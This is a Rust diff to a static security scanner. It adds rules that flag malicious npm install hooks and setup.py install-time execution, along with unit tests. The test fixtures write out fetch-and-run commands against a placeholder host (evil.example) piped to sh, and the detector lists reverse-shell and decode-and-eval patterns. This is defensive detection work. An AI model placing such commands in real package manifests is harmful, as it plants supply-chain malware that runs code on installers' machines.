@@ -1104,6 +1104,10 @@ fn scan_one_file(
     if let Some(language) = detected {
         scan_secrets(root, path, &source, language, &mut findings);
     }
+    // Supply-chain install-hook detection runs on RAW source (like the secret scan) and
+    // is gated by filename, independent of language classification — a package.json is
+    // not otherwise a "recognized" source file.
+    scan_supply_chain_install_hooks(root, path, &source, &mut findings);
     match detected {
         Some("ada") => {
             let analysis_source = strip_comments_for_language(&source, "ada");
@@ -5275,6 +5279,142 @@ fn push_dockerfile_secret_arg_env(
         "A Dockerfile ARG or ENV variable name indicates secret material that can persist in image metadata or layers.",
         line.trim(),
     );
+}
+
+/// A package manifest scanned for supply-chain install hooks (`package.json`; `setup.py`
+/// is already discovered as Python).
+fn is_supply_chain_manifest(path: &Path) -> bool {
+    matches!(
+        path.file_name().and_then(|n| n.to_str()),
+        Some("package.json")
+    )
+}
+
+/// Dispatch supply-chain install-hook detectors by filename (raw source).
+fn scan_supply_chain_install_hooks(
+    root: &Path,
+    path: &Path,
+    source: &str,
+    findings: &mut Vec<StaticFinding>,
+) {
+    match path.file_name().and_then(|n| n.to_str()) {
+        Some("package.json") => scan_npm_install_hook(root, path, source, findings),
+        Some("setup.py") => scan_python_setup_install_hook(root, path, source, findings),
+        _ => {}
+    }
+}
+
+/// GF-559: an npm `preinstall`/`install`/`postinstall` script that fetches-and-executes
+/// remote code, evals an inline/encoded payload, or opens a reverse shell. The malware
+/// vector behind most npm package compromises; ordinary build hooks don't do this.
+fn scan_npm_install_hook(
+    root: &Path,
+    path: &Path,
+    source: &str,
+    findings: &mut Vec<StaticFinding>,
+) {
+    for (index, line) in source.lines().enumerate() {
+        let Some(key) = npm_install_hook_key(line) else {
+            continue;
+        };
+        if install_command_is_suspicious(line) {
+            let column = line.find(key).map(|c| c + 1).unwrap_or(1);
+            push_pattern(
+                findings,
+                root,
+                path,
+                index,
+                column,
+                "GF-559",
+                "config",
+                "npm-install-hook-execution",
+                "npm install hook fetches or executes remote code",
+                "supply-chain",
+                "A package.json install hook fetches-and-executes remote code, evals an encoded payload, or opens a reverse shell.",
+                line.trim(),
+            );
+        }
+    }
+}
+
+/// Recognize an npm install-hook JSON key (`"preinstall"` / `"install"` / `"postinstall"`)
+/// on the line; the leading quote keeps `"uninstall"` and prose from matching.
+fn npm_install_hook_key(line: &str) -> Option<&'static str> {
+    ["\"preinstall\"", "\"postinstall\"", "\"install\""]
+        .into_iter()
+        .find(|key| line.contains(key))
+}
+
+/// A shell/interpreter command that fetches-and-executes, evals an inline/encoded
+/// payload, spawns a subprocess, or opens a reverse shell — the high-signal set, so a
+/// normal `node-gyp rebuild` / `tsc` build hook does not fire.
+fn install_command_is_suspicious(command: &str) -> bool {
+    let s = command.to_ascii_lowercase();
+    let piped_to_shell = (s.contains("curl") || s.contains("wget"))
+        && (s.contains("| sh")
+            || s.contains("|sh")
+            || s.contains("| bash")
+            || s.contains("|bash")
+            || s.contains("| node")
+            || s.contains("|node")
+            || s.contains("| python")
+            || s.contains("|python"));
+    piped_to_shell
+        || s.contains("node -e")
+        || s.contains("node --eval")
+        || s.contains("python -c")
+        || s.contains("python3 -c")
+        || s.contains("base64 -d")
+        || s.contains("base64 --decode")
+        || s.contains("atob(")
+        || s.contains("eval(")
+        || s.contains("/dev/tcp/")
+        || s.contains("child_process")
+}
+
+/// GF-560: a setup.py that shells out (os.system / subprocess) or dynamically executes
+/// obfuscated code at install time — the PyPI supply-chain-malware "command overwrite".
+fn scan_python_setup_install_hook(
+    root: &Path,
+    path: &Path,
+    source: &str,
+    findings: &mut Vec<StaticFinding>,
+) {
+    let has_obfuscation = source.contains("base64")
+        || source.contains("b64decode")
+        || source.contains("codecs.decode");
+    for (index, line) in source.lines().enumerate() {
+        let trimmed = line.trim_start();
+        if trimmed.starts_with('#') {
+            continue;
+        }
+        let process_exec = trimmed.contains("os.system(")
+            || trimmed.contains("os.popen(")
+            || trimmed.contains("subprocess.Popen(")
+            || trimmed.contains("subprocess.call(")
+            || trimmed.contains("subprocess.run(")
+            || trimmed.contains("subprocess.check_output(")
+            || trimmed.contains("subprocess.check_call(");
+        let obfuscated_exec =
+            has_obfuscation && (trimmed.contains("exec(") || trimmed.contains("eval("));
+        if process_exec || obfuscated_exec {
+            let column = line.len() - trimmed.len() + 1;
+            push_pattern(
+                findings,
+                root,
+                path,
+                index,
+                column,
+                "GF-560",
+                "python",
+                "python-setup-install-execution",
+                "Python setup.py runs a process or code at install time",
+                "supply-chain",
+                "A setup.py shells out (os.system/subprocess) or evals obfuscated data, which runs automatically on pip install.",
+                trimmed,
+            );
+        }
+    }
 }
 
 fn scan_dockerfile_download_piped_to_shell(
@@ -29113,6 +29253,11 @@ fn is_supported_file(path: &Path) -> bool {
     if dockerfile_config_path(path) {
         return true;
     }
+    // Package manifests scanned for supply-chain install hooks (package.json has no
+    // recognized source extension; setup.py is already covered as Python).
+    if is_supply_chain_manifest(path) {
+        return true;
+    }
     path.extension()
         .and_then(|ext| ext.to_str())
         .is_some_and(|ext| {
@@ -33018,6 +33163,59 @@ mod tests {
         );
         assert_eq!(
             scan_config_path_rules("/t/build.sh", dockerfile),
+            Vec::<String>::new()
+        );
+    }
+
+    fn supply_chain_hook_rules(path: &str, source: &str) -> Vec<String> {
+        let mut findings = Vec::new();
+        scan_supply_chain_install_hooks(Path::new("/t"), Path::new(path), source, &mut findings);
+        let mut ids: Vec<String> = findings.into_iter().map(|f| f.rule_id).collect();
+        ids.sort();
+        ids
+    }
+
+    #[test]
+    fn gf559_flags_malicious_npm_install_hooks() {
+        let fetch_exec = "{\n  \"scripts\": {\n    \"postinstall\": \"curl -s https://evil.example/x.sh | sh\"\n  }\n}\n";
+        assert_eq!(
+            supply_chain_hook_rules("/t/package.json", fetch_exec),
+            vec!["GF-559"]
+        );
+        let inline_eval =
+            "{ \"scripts\": { \"preinstall\": \"node -e require('child_process').exec('id')\" } }";
+        assert!(
+            supply_chain_hook_rules("/t/package.json", inline_eval).contains(&"GF-559".to_owned())
+        );
+        // A normal build hook does not fire.
+        let benign =
+            "{ \"scripts\": { \"postinstall\": \"node-gyp rebuild\", \"build\": \"tsc\" } }";
+        assert_eq!(
+            supply_chain_hook_rules("/t/package.json", benign),
+            Vec::<String>::new()
+        );
+        // Only package.json is scanned.
+        assert_eq!(
+            supply_chain_hook_rules("/t/other.json", fetch_exec),
+            Vec::<String>::new()
+        );
+    }
+
+    #[test]
+    fn gf560_flags_setup_py_install_execution() {
+        let shell_out =
+            "from setuptools import setup\nimport os\nos.system('curl https://evil.example/x | sh')\nsetup(name='x')\n";
+        assert_eq!(
+            supply_chain_hook_rules("/t/setup.py", shell_out),
+            vec!["GF-560"]
+        );
+        let obfuscated = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n";
+        assert!(supply_chain_hook_rules("/t/setup.py", obfuscated).contains(&"GF-560".to_owned()));
+        // A declarative setup.py does not fire.
+        let benign =
+            "from setuptools import setup, find_packages\nsetup(name='x', packages=find_packages())\n";
+        assert_eq!(
+            supply_chain_hook_rules("/t/setup.py", benign),
             Vec::<String>::new()
         );
     }
